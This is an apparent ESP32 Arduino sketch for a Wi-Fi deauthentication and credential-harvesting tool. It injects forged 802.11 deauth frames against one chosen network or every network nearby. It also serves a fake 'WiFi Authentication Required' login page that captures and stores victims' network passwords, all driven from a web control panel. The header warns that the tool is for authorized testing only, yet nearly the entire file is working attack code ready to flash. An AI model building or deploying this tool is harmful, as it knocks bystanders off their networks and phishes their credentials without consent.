/*
 * ESP32 WiFi DeAuth & Credential Harvester
 *
 * WARNING: This tool is for AUTHORIZED PENETRATION TESTING ONLY!
 * Unauthorized use is illegal. Only use on networks you own or have explicit permission to test.
 *
 * Features:
 * - Auto DeAuth Attack (deauths all nearby networks)
 * - Selective DeAuth (target specific networks)
 * - Captive Portal for Credential Harvesting
 * - Web Interface for Command & Control via AP
 * - Configurable attack parameters
 *
 * Author: ESP32 Security Research
 * License: For educational and authorized testing only
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <SPIFFS.h>
#include <Preferences.h>

// Configuration
#define AP_SSID "ESP32_Control"
#define AP_PASS "deauth123"
#define DNS_PORT 53
#define WEB_PORT 80

// Attack modes
enum AttackMode {
  MODE_IDLE,
  MODE_AUTO_DEAUTH,
  MODE_SELECTIVE_DEAUTH,
  MODE_CAPTIVE_PORTAL,
  MODE_SCAN
};

// Global objects
WebServer server(WEB_PORT);
DNSServer dnsServer;
Preferences preferences;

// Attack parameters
AttackMode currentMode = MODE_IDLE;
bool attackRunning = false;
int deauthPacketsPerAP = 20;
int deauthDelay = 100;
String targetSSID = "";
String targetBSSID = "";
std::vector<String> capturedCredentials;

// Scan results
int networkCount = 0;
struct NetworkInfo {
  String ssid;
  String bssid;
  int channel;
  int rssi;
  bool selected;
};
std::vector<NetworkInfo> networks;

// Deauth packet structure
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         // Type/Subtype: Deauthentication
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID - will be filled)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID - will be filled)
  0x00, 0x00,                         // Fragment & Sequence
  0x07, 0x00                          // Reason: Class 3 frame from non-associated STA
};

// Function prototypes
void setupAP();
void setupWebServer();
void handleRoot();
void handleScan();
void handleAttack();
void handleStop();
void handleStatus();
void handleCaptive();
void handleCredentials();
void handleSaveCredentials();
void scanNetworks();
void performDeauth();
void deauthNetwork(uint8_t* bssid, int channel);
void captivePortalTask(void* parameter);

void setup() {
  Serial.begin(115200);
  Serial.println("\n\n=================================");
  Serial.println("ESP32 DeAuth & Credential Harvester");
  Serial.println("=================================\n");

  // Initialize SPIFFS for web files
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS Mount Failed - will create in memory");
  }

  // Initialize preferences
  preferences.begin("esp32-deauth", false);

  // Setup Access Point
  setupAP();

  // Setup Web Server
  setupWebServer();

  // Start DNS server for captive portal
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  Serial.println("\n[+] Setup Complete!");
  Serial.println("[+] Connect to AP: " + String(AP_SSID));
  Serial.println("[+] Password: " + String(AP_PASS));
  Serial.println("[+] Control Panel: http://" + WiFi.softAPIP().toString());
  Serial.println("[+] Ready for commands!\n");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Execute attack if running
  if (attackRunning) {
    switch(currentMode) {
      case MODE_AUTO_DEAUTH:
        performDeauth();
        break;
      case MODE_SELECTIVE_DEAUTH:
        if (targetBSSID.length() > 0) {
          uint8_t bssid[6];
          sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                 &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
          for (auto& net : networks) {
            if (net.bssid == targetBSSID) {
              deauthNetwork(bssid, net.channel);
              break;
            }
          }
        }
        delay(deauthDelay);
        break;
      default:
        break;
    }
  }

  delay(10);
}

void setupAP() {
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP(AP_SSID, AP_PASS);

  Serial.println("[+] Access Point Started");
  Serial.println("    SSID: " + String(AP_SSID));
  Serial.println("    IP: " + WiFi.softAPIP().toString());
}

void setupWebServer() {
  // Main control panel
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/stop", handleStop);
  server.on("/status", handleStatus);
  server.on("/credentials", handleCredentials);

  // Captive portal handlers
  server.on("/captive", handleCaptive);
  server.on("/save-credentials", HTTP_POST, handleSaveCredentials);

  // Catch-all for captive portal
  server.onNotFound(handleCaptive);

  server.begin();
  Serial.println("[+] Web Server Started on port " + String(WEB_PORT));
}

void handleRoot() {
  String html = R"(
<!DOCTYPE html>
<html>
<head>
  <title>ESP32 DeAuth Control</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
      color: #fff;
      padding: 20px;
      min-height: 100vh;
    }
    .container {
      max-width: 800px;
      margin: 0 auto;
      background: rgba(255,255,255,0.1);
      border-radius: 15px;
      padding: 30px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    }
    h1 {
      text-align: center;
      margin-bottom: 10px;
      font-size: 2em;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
    }
    .warning {
      background: rgba(255,0,0,0.2);
      border: 2px solid #ff4444;
      border-radius: 10px;
      padding: 15px;
      margin: 20px 0;
      text-align: center;
      font-weight: bold;
    }
    .section {
      background: rgba(255,255,255,0.05);
      border-radius: 10px;
      padding: 20px;
      margin: 20px 0;
    }
    .section h2 {
      margin-bottom: 15px;
      color: #4fc3f7;
    }
    button {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      margin: 5px;
      transition: transform 0.2s, box-shadow 0.2s;
      font-weight: bold;
    }
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }
    button:active {
      transform: translateY(0);
    }
    .btn-danger {
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
    }
    .btn-success {
      background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
    }
    .btn-warning {
      background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid rgba(255,255,255,0.3);
      background: rgba(255,255,255,0.1);
      color: white;
      font-size: 14px;
    }
    #status {
      padding: 15px;
      background: rgba(0,0,0,0.3);
      border-radius: 8px;
      margin: 15px 0;
      font-family: 'Courier New', monospace;
    }
    #networks {
      max-height: 300px;
      overflow-y: auto;
      margin: 15px 0;
    }
    .network-item {
      background: rgba(255,255,255,0.08);
      padding: 12px;
      margin: 8px 0;
      border-radius: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .network-item:hover {
      background: rgba(255,255,255,0.15);
    }
    .network-info {
      flex-grow: 1;
    }
    .network-ssid {
      font-weight: bold;
      font-size: 16px;
    }
    .network-details {
      font-size: 12px;
      opacity: 0.8;
      margin-top: 5px;
    }
    .stat {
      display: inline-block;
      background: rgba(255,255,255,0.1);
      padding: 5px 10px;
      border-radius: 5px;
      margin: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🛡️ ESP32 DeAuth Control Panel</h1>

    <div class="warning">
      ⚠️ AUTHORIZED USE ONLY - For penetration testing on networks you own or have permission to test!
    </div>

    <div class="section">
      <h2>📡 Network Scanner</h2>
      <button onclick="scanNetworks()" class="btn-success">Scan Networks</button>
      <div id="networks"></div>
    </div>

    <div class="section">
      <h2>⚔️ Attack Controls</h2>
      <label>Attack Mode:</label>
      <select id="mode">
        <option value="auto">Auto DeAuth (All Networks)</option>
        <option value="selective">Selective DeAuth (Choose Target)</option>
        <option value="captive">Captive Portal (Credential Harvest)</option>
      </select>

      <label>Packets per AP:</label>
      <input type="number" id="packets" value="20" min="1" max="100">

      <label>Delay (ms):</label>
      <input type="number" id="delay" value="100" min="10" max="1000">

      <button onclick="startAttack()" class="btn-danger">🚀 Start Attack</button>
      <button onclick="stopAttack()" class="btn-warning">🛑 Stop Attack</button>
    </div>

    <div class="section">
      <h2>📊 Status</h2>
      <div id="status">
        <div class="stat">Mode: <span id="current-mode">IDLE</span></div>
        <div class="stat">Status: <span id="attack-status">Stopped</span></div>
        <div class="stat">Networks Found: <span id="net-count">0</span></div>
      </div>
      <button onclick="updateStatus()" class="btn-success">🔄 Refresh Status</button>
      <button onclick="viewCredentials()" class="btn-warning">🔑 View Captured Credentials</button>
    </div>
  </div>

  <script>
    function scanNetworks() {
      document.getElementById('networks').innerHTML = '<p>Scanning...</p>';
      fetch('/scan')
        .then(r => r.json())
        .then(data => {
          let html = '';
          document.getElementById('net-count').innerText = data.networks.length;
          data.networks.forEach((net, i) => {
            html += `
              <div class="network-item" onclick="selectNetwork(${i})">
                <div class="network-info">
                  <div class="network-ssid">${net.ssid}</div>
                  <div class="network-details">
                    BSSID: ${net.bssid} | Channel: ${net.channel} | RSSI: ${net.rssi} dBm
                  </div>
                </div>
                <button onclick="targetNetwork('${net.bssid}', ${net.channel}); event.stopPropagation();">Target</button>
              </div>
            `;
          });
          document.getElementById('networks').innerHTML = html || '<p>No networks found</p>';
        });
    }

    function targetNetwork(bssid, channel) {
      alert('Targeted: ' + bssid + ' on channel ' + channel);
    }

    function startAttack() {
      const mode = document.getElementById('mode').value;
      const packets = document.getElementById('packets').value;
      const delay = document.getElementById('delay').value;

      fetch(`/attack?mode=${mode}&packets=${packets}&delay=${delay}`)
        .then(r => r.json())
        .then(data => {
          alert(data.message);
          updateStatus();
        });
    }

    function stopAttack() {
      fetch('/stop')
        .then(r => r.json())
        .then(data => {
          alert(data.message);
          updateStatus();
        });
    }

    function updateStatus() {
      fetch('/status')
        .then(r => r.json())
        .then(data => {
          document.getElementById('current-mode').innerText = data.mode;
          document.getElementById('attack-status').innerText = data.running ? 'RUNNING' : 'Stopped';
        });
    }

    function viewCredentials() {
      fetch('/credentials')
        .then(r => r.json())
        .then(data => {
          if (data.credentials.length === 0) {
            alert('No credentials captured yet');
          } else {
            let msg = 'Captured Credentials:\\n\\n';
            data.credentials.forEach(c => {
              msg += c + '\\n';
            });
            alert(msg);
          }
        });
    }

    // Auto-refresh status every 3 seconds
    setInterval(updateStatus, 3000);
    updateStatus();
  </script>
</body>
</html>
  )";

  server.send(200, "text/html", html);
}

void handleScan() {
  scanNetworks();

  String json = "{\"networks\":[";
  for (int i = 0; i < networks.size(); i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + networks[i].ssid + "\",";
    json += "\"bssid\":\"" + networks[i].bssid + "\",";
    json += "\"channel\":" + String(networks[i].channel) + ",";
    json += "\"rssi\":" + String(networks[i].rssi);
    json += "}";
  }
  json += "]}";

  server.send(200, "application/json", json);
}

void handleAttack() {
  String mode = server.arg("mode");
  deauthPacketsPerAP = server.arg("packets").toInt();
  deauthDelay = server.arg("delay").toInt();

  if (mode == "auto") {
    currentMode = MODE_AUTO_DEAUTH;
    Serial.println("[!] Starting AUTO DEAUTH mode");
  } else if (mode == "selective") {
    currentMode = MODE_SELECTIVE_DEAUTH;
    Serial.println("[!] Starting SELECTIVE DEAUTH mode");
  } else if (mode == "captive") {
    currentMode = MODE_CAPTIVE_PORTAL;
    Serial.println("[!] Starting CAPTIVE PORTAL mode");
    // Will implement captive portal in separate task
  }

  attackRunning = true;

  server.send(200, "application/json", "{\"message\":\"Attack started!\"}");
}

void handleStop() {
  attackRunning = false;
  currentMode = MODE_IDLE;
  Serial.println("[!] Attack stopped");

  server.send(200, "application/json", "{\"message\":\"Attack stopped!\"}");
}

void handleStatus() {
  String modeStr = "IDLE";
  switch(currentMode) {
    case MODE_AUTO_DEAUTH: modeStr = "AUTO_DEAUTH"; break;
    case MODE_SELECTIVE_DEAUTH: modeStr = "SELECTIVE_DEAUTH"; break;
    case MODE_CAPTIVE_PORTAL: modeStr = "CAPTIVE_PORTAL"; break;
    case MODE_SCAN: modeStr = "SCANNING"; break;
  }

  String json = "{";
  json += "\"mode\":\"" + modeStr + "\",";
  json += "\"running\":" + String(attackRunning ? "true" : "false") + ",";
  json += "\"networks\":" + String(networks.size());
  json += "}";

  server.send(200, "application/json", json);
}

void handleCaptive() {
  String html = R"(
<!DOCTYPE html>
<html>
<head>
  <title>WiFi Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 90%;
    }
    h2 { text-align: center; color: #333; }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover { background: #45a049; }
    .info {
      text-align: center;
      color: #666;
      margin-bottom: 20px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>WiFi Authentication Required</h2>
    <div class="info">Please enter your WiFi credentials to continue</div>
    <form action="/save-credentials" method="POST">
      <input type="text" name="ssid" placeholder="Network Name (SSID)" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Connect</button>
    </form>
  </div>
</body>
</html>
  )";

  server.send(200, "text/html", html);
}

void handleSaveCredentials() {
  String ssid = server.arg("ssid");
  String password = server.arg("password");

  String cred = "SSID: " + ssid + " | Password: " + password;
  capturedCredentials.push_back(cred);

  Serial.println("\n[+] CREDENTIAL CAPTURED!");
  Serial.println("    " + cred);

  // Save to preferences
  preferences.putString("cred_" + String(capturedCredentials.size()), cred);

  String html = R"(
<!DOCTYPE html>
<html>
<head>
  <title>Connected</title>
  <meta http-equiv="refresh" content="3;url=/">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    .message {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
    }
    h2 { color: #4CAF50; }
  </style>
</head>
<body>
  <div class="message">
    <h2>✓ Authentication Successful</h2>
    <p>You are now connected to the network.</p>
    <p>Redirecting...</p>
  </div>
</body>
</html>
  )";

  server.send(200, "text/html", html);
}

void handleCredentials() {
  String json = "{\"credentials\":[";
  for (int i = 0; i < capturedCredentials.size(); i++) {
    if (i > 0) json += ",";
    json += "\"" + capturedCredentials[i] + "\"";
  }
  json += "]}";

  server.send(200, "application/json", json);
}

void scanNetworks() {
  Serial.println("[*] Scanning networks...");
  networks.clear();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks();
  Serial.println("[*] Found " + String(n) + " networks");

  for (int i = 0; i < n; i++) {
    NetworkInfo net;
    net.ssid = WiFi.SSID(i);
    net.bssid = WiFi.BSSIDstr(i);
    net.channel = WiFi.channel(i);
    net.rssi = WiFi.RSSI(i);
    net.selected = false;

    networks.push_back(net);

    Serial.printf("  [%d] %s (%s) Ch:%d RSSI:%d\n",
                  i, net.ssid.c_str(), net.bssid.c_str(), net.channel, net.rssi);
  }

  WiFi.mode(WIFI_MODE_APSTA);
}

void performDeauth() {
  if (networks.size() == 0) {
    Serial.println("[!] No networks found. Scanning...");
    scanNetworks();
    return;
  }

  Serial.println("[*] Sending deauth packets...");

  for (auto& net : networks) {
    uint8_t bssid[6];
    sscanf(net.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

    deauthNetwork(bssid, net.channel);
    delay(deauthDelay);
  }
}

void deauthNetwork(uint8_t* bssid, int channel) {
  // Set WiFi channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Update deauth packet with target BSSID
  memcpy(&deauthPacket[10], bssid, 6);  // Source address
  memcpy(&deauthPacket[16], bssid, 6);  // BSSID

  // Send deauth packets
  for (int i = 0; i < deauthPacketsPerAP; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delayMicroseconds(100);
  }

  Serial.printf("[*] Sent %d deauth packets to %02X:%02X:%02X:%02X:%02X:%02X on channel %d\n",
                deauthPacketsPerAP, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
}
